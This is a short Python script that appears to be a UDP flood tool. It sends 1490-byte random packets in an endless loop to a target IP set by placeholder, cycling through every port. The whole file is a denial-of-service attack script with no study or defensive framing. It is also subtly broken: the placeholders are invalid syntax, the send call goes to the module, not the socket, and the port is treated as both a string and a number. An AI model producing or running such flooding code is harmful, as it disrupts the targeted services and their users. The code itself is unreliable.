import socket
import random

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
data = random._urandom(1490)

ip = <"SET_IP">
port = <"SET_PORT">

sent = 0 

while True:
  socket.sendto(data, (ip,int(port)))
  print("sending...")
  sent += 1
  port += 1
  if port == 65534:
    port = 1
